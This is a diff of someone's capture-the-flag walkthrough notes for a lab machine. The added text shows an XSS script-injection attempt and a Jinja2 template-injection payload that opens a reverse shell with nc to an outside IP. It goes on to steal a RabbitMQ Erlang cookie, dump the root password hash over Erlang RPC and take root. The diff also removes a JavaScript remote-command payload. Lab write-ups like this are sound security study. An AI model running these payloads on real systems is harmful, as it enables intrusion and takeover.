@@ -148,37 +148,112 @@ we see test page with POST request
 go to caido and start handcheck ![[Pasted image 20251106213414.png]]
 ![[Pasted image 20251106213944.png]]
 XSS 
-maybe applicaton paste string in code, lets try to start shell from shell.js
+maybe applicaton paste string in code, lets try to start shell from js code like
 ```js
-(function(){
-  const attacker = "http://10.11.147.65:9000";
+{
+  "username": "</h1><script src='http://IP:Port/shell.js'></script><h1>"
+}
+```
+i cant start shell from this, now lets try to take insides application of server, use this command
+```http
+{
+"username":"${{<%[%'\"}}%\\."
+}
+```
+and now we have
+```http
+HTTP/1.1 200 OK
+Date: Fri, 07 Nov 2025 11:34:54 GMT
+Server: Apache/2.4.52 (Ubuntu)
+X-Powered-By: Express
+Content-Type: text/html; charset=utf-8
+ETag: W/"4f34-uy7o4+9SBW968crwpJz2QgsVIPY-gzip"
+Vary: Accept-Encoding
+Content-Length: 20276
+Connection: close
 
-  function send(data) {
-    fetch(attacker + "/shell", {
-      method: "POST",
-      body: JSON.stringify({ output: data }),
-      headers: { "Content-Type": "application/json" }
-    });
-  }
+<!doctype html>
+<html lang=en>
 
-  function poll() {
-    fetch(attacker + "/cmd")
-      .then(res => res.text())
-      .then(cmd => {
-        try {
-          let result = eval(cmd);
-          send(result);
-        } catch(e) {
-          send("Error: " + e.toString());
-        }
-      })
-      .catch(() => {});
-  }
+<head>
+    <title>jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
+        // Werkzeug Debugger</title>
+    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
+    <link rel="shortcut icon" href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
+    <script>
+        var CONSOLE_MODE = false,
+            EVALEX = true,
+            EVALEX_TRUSTED = false,
+            SECRET = "weV5OYRg36TFXV1rLMQr";
+    </script>
+</head>
+```
+jinja2 and open debugmode with secret, first try to take shell from jinja2
+command for this
+```http
+{
+"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.11.147.65 9000 > /tmp/f').read() }}"
+}
+```
+![[Pasted image 20251107184137.png]]
+we have our first shell, take user flag
+```shell
+....
+-rw------- 1 azrael azrael   33 Aug 11  2024 user.txt
+azrael@forge:~$ cat user.txt
+cat user.txt
+98d3a30fa86523c580144d317be0c47e
 
-  setInterval(poll, 3000);
-})();
+```
+remember about our `rabbithole`, try to get .erlang cookie by standart path
+`/var/lib/rabbitmq/.erlang.cookie` for process, try to cat
+```shell
+azrael@forge:~$ cat /var/lib/rabbitmq/.erlang.cookie
+cat /var/lib/rabbitmq/.erlang.cookie
+Wka5wuFO2ZEpnA8Q
+```
+use hacktricks and this cookie, try to use @forge because we have azrael forge, and before we go next need to add forge in `/etc/hosts`
+```shell
+erl -sname user -setcookie Wka5wuFO2ZEpnA8Q 
+Erlang/OTP 25 [erts-13.1.5] [source] [64-bit] [smp:6:6] [ds:6:6:10] [async-threads:1] [jit:ns]
+
+Eshell V13.1.5  (abort with ^G)
+(user@kali)1> rpc:call('rabbit@forge', rabbit_auth_backend_internal, lookup_user, [<<"root">>]).
+{ok,{internal_user,<<"root">>,
+                   <<227,215,186,133,41,93,29,22,162,97,125,246,247,230,99,5,
+                     39,255,47,30,187,92,67,179,...>>,
+                   [administrator],
+                   rabbit_password_hashing_sha256}}
 ```
 
+to go next we must convert password hash do base64 to take every bit
+because RabbitMQ hashing passords by this schema
+```shell
+base64(4-byte-salt || SHA256(salt || password))
+```
+to take root base64(password) use this command
+```shell
+(user@kali)2> io:format("~s~n", [base64:encode(element(3, element(2, rpc:call('rabbit@forge', rabbit_auth_backend_internal, lookup_user, [<<"root">>]))))]).
+49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF
+ok
+```
+we have a hash decode from base64 to hex and take this:
+```shell
+echo -n '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 100
+e3d7ba85 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
+╰──────╯ ╰──────────────────────────────────────────────────────────────╯
+  Salt                               SHA256-hash
+```
+take a root
+```shell
+azrael@forge:~/chatbotServer$ su root 
+su root 
+Password: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
 
+id  
+uid=0(root) gid=0(root) groups=0(root)
 
-
+cat root.txt 
+eabf7a0b05d3f2028f3e0465d2fd0852
+```
